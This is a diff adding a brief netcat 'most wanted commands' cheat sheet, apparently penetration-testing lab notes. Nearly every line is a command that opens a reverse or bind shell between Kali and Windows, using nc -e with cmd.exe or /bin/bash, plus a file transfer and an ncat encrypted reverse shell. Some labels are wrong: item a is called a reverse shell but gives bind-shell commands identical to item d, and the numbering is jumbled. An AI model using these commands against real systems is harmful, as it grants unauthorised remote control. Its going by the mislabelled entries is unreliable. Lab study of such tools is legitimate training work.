@@ -1,0 +1,17 @@
+#most wanted command for nc
+a. Reverse  shell  from  Kali  to  Windows
+    Windows: nc -nlvp [port] -e(execute) cmd.exe  Kali: nc -nv [IP] [PORT]
+b. Reverse  shell  from  Windows  to  Kali
+    Windows: nc -nlvp [port] Kali: nc -nv [IP] [PORT] -e /bin/bash
+c. Bind  shell  on  Kali.  Use  your  Windows  client  to  connect  to  it
+    Kali: nc -nlvp [port] -e /bin/bash Windows: nc -nv [IP] [PORT]
+d. Bind  shell  on  Windows.  Use  your  Kali  system  to  connect  to  it  
+     Windows: nc -nlvp [port] -e(execute) cmd.exe  Kali: nc -nv [IP] [PORT]
+                                          
+3. Transfer  a  file  from  your  Kali  system  to  Windows  and  vice  versa
+     Windows: nc -nlvp [port] > incoming.txt  Kali: nc -nv [IP] [PORT]
+     
+1. Use Ncat to create an encrypted reverse shell from your Windows system to your
+Kali machine
+Windows Machin: ncat -v [IP_Kali] listining Port
+Kali: ncat --exe /bin/bash [IP-WIN] --allow -vnl listining Port --ssl
